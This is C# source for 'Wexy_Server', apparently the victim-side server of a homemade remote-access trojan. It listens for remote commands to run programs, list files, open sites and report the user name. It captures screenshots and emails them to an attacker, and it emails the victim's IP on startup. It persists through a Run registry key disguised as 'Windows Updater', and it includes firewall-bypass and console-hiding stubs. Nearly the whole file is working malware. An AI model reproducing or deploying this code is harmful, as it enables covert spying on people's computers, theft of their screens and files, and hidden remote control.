using System.Net.Sockets;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System;
using System.Drawing.Imaging;
using System.Net.Mail;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Data;
using System.Security.Cryptography;


namespace Wexy_Server
{
    class Server
    {
        public static NetworkStream Receiver;
        public static NetworkStream Writer;

        //[DllImport("user32.dll")]
        //public static extern bool FreeConsole(); //hides the console from view.

        //TODO - > the server must be able to connect to the internet without being blocked by the firewall
        public static void BypassFirewall()
        {

        }

        //TODO - > Disconnect the client
        public static void DisconnectClient()
        {
                
        }
        
       
        
        public static void ReceiveCommands()
        {
            //Infinite loop 
            while (true)
            {
                //try to read the data from the client(the hacker)
                try
                {
                    //Packet of the received data
                    byte[] RecPacket = new byte[1000];

                    //Read a command from the client.
                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    //Flush the receiver
                    Receiver.Flush();

                    //Convert the packet into readable string
                    string command = Encoding.ASCII.GetString(RecPacket);

                    //Split the command into two different strings based on the splitter we made, >
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(command, ">");

                    //Get the actual command.
                    command = CommandArray[0];

                    switch (command)
                    {
                        case "msg":
                            //Display the message in a messagebox (the trim removes any excess data received)
                            string Msg = CommandArray[1];
                            DisplayMessage(Msg);
                            break;

                        case "open":
                            //Open the website with internet explorer
                            string site = CommandArray[1];
                            OpenWebsite(site);
                            break;

                        case "ss":
                            //Draw the screen and transform it into an actual image
                            TakeScreenshot();
                            break;

                        case "pcname":
                            //Get the pc name
                            SendPCName();
                            break;

                        case "showfiles":
                            string dir = CommandArray[1];
                            if (dir == "C")
                            {
                                dir = @"C:/";
                                ListFiles(dir);
                                break;
                            }
                                
                            else
                            {
                                dir = @"C:/users/" + Environment.UserName + "/Desktop/";
                                ListFiles(dir);
                                break;
                            }

                        case "openApp":
                            //Open specified application
                            string appName = CommandArray[1];
                            openApp(appName);
                            break;

                        case "disconnect":
                            break;
                    }
                }
                catch
                {
                    break;
                }
            }
        }


        #region Commands

       
        //- ALMOST OK - [NOT TESTED YET]> returns the computer's IP adress.
        public static string getIp()
        {
            string uneReponse = "";
            //Create a request for the URL
            try
            {
                WebRequest request = WebRequest.Create("http://myexternalip.com/raw");
                //Get the response
                WebResponse response = request.GetResponse();
                //Get the stream containning the data sent by the server
                Stream dataStream = response.GetResponseStream();
                //Open the stream with streamreader for easy access.
                StreamReader reader = new StreamReader(dataStream);
                //Read the content.
                string responseFromServer = reader.ReadToEnd();
                reader.Close();
                response.Close();
                uneReponse = responseFromServer;
            }
            catch
            { }
            return uneReponse;
        }


        //- ALMOST OK - [NOT TESTED YET] the server hides itself inside the registry and is launched on Windows startup.
        public static void AddToStartup()
        {
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser
                 .OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                //We set the key name to Windows Updater ,so if the victim browses throught the registry , he won't notice anything malicious.
                key.SetValue("Windows Updater", "\"" + Application.ExecutablePath + "\"");
            }
        }

        //- ALMOST OK - [NOT TESTED YET] the server tells the client he is alive and sends him the victim's IP. 
        //To be called on main.
        public static void NotifyClient()
        {
            try
            {
                //Configure the stmp client
                SmtpClient client = new SmtpClient("smtp.live.com");
                client.Port = 587;
                client.EnableSsl = true;
                client.Timeout = 100000;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Credentials = new System.Net.NetworkCredential("your_mail_sender", "your_password");

                //Configure the mail to send
                //Attachment objAttachment = new Attachment(@"path_to_file_you_wanna");
                MailMessage msg = new MailMessage();
                msg.To.Add("your_mail_receiver");
                msg.From = new MailAddress("your_mail_sender");
                //msg.Attachments.Add(objAttachment);
                msg.Subject = "Wexy server has started ! ";
                msg.Body = "Wexy server is alive at -> " + getIp();

                client.Send(msg);
            }
            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
            {
                Environment.Exit(0);
            }
        }

        // - ALMOST OK - 
        public static void openApp(string applicationName)
        {
            System.Diagnostics.Process app = new System.Diagnostics.Process();
            app.StartInfo.FileName = applicationName;
            app.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
            app.Start();
        }

        // - NOT OK - [Ramdom blank lines appear..]
        public static void ListFiles(string location)
        {
            string allFiles = "";
            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(location);
            
            foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
            {
                allFiles = allFiles +"\n"+f.Name;
            }

            byte[] Packet = Encoding.ASCII.GetBytes(allFiles);
            Writer.Write(Packet, 0, Packet.Length);
            Writer.Flush();
        }

        // - ALMOST OK - [Multiple blank lines generated after the Computer name is received.]
        public static void SendPCName()
        {
            try
            {
                string pcname = Environment.UserName;

                //Creates a packet to hold the command, and gets the bytes from the string variable
                byte[] Packet = Encoding.ASCII.GetBytes(pcname);

                //Send the command over the network
                Writer.Write(Packet, 0, Packet.Length);

                //Flush out any extra data that didnt send in the start.
                Writer.Flush();
            }
            catch
            {
                Console.WriteLine("client disconnected from server!");
                Console.ReadKey();
                Writer.Close();
            }
        }

        // - OK - 
        public static void TakeScreenshot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg", ImageFormat.Jpeg);
            sendScreenshot();
            System.IO.File.Delete(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
        }

        // - OK - 
        public static void sendScreenshot()
        {
            try
            {
                //Configure the stmp client
                SmtpClient client = new SmtpClient("smtp.live.com");
                client.Port = 587;
                client.EnableSsl = true;
                client.Timeout = 100000;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Credentials = new System.Net.NetworkCredential("your_mail_sender", "your_password");

                //Configure the mail to send
                Attachment objAttachment = new Attachment(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
                MailMessage msg = new MailMessage();
                msg.To.Add("your_mail_receiver");
                msg.From = new MailAddress("your_mail_sender");
                msg.Attachments.Add(objAttachment);
                msg.Subject = "New screenshot";
                msg.Body = "Target screen was captured :D";

                client.Send(msg);
            }
            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
            {
                Environment.Exit(0);
            }
        }

        // - OK - 
        public static void OpenWebsite(string website)
        {
            System.Diagnostics.Process IE = new System.Diagnostics.Process();
            IE.StartInfo.FileName = "iexplore.exe";
            IE.StartInfo.Arguments = website.Trim('\0');
            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
            IE.Start();
        }

        // - OK - 
        public static void DisplayMessage(string message)
        {
            System.Windows.Forms.MessageBox.Show(message.Trim('\0'));
        }

        #endregion





        static void Main(string[] args)
        {
            //FreeConsole();

            TcpListener l = new TcpListener(System.Net.IPAddress.Any, 2000);
            l.Start();

            //Wait for client to connect, then make a TcpClient to accept the connection
            TcpClient connection = l.AcceptTcpClient();
            

            //Get Connection's stream
            Receiver = connection.GetStream();

            //Allows us to write send data to the client
            Writer = connection.GetStream();

            //Start the receive commands thread
            //We will run the ReceiveCommands() method on another thread, so the CPU doesnt go haywire
            System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveCommands));
            Rec.Start();
        }
    }
}
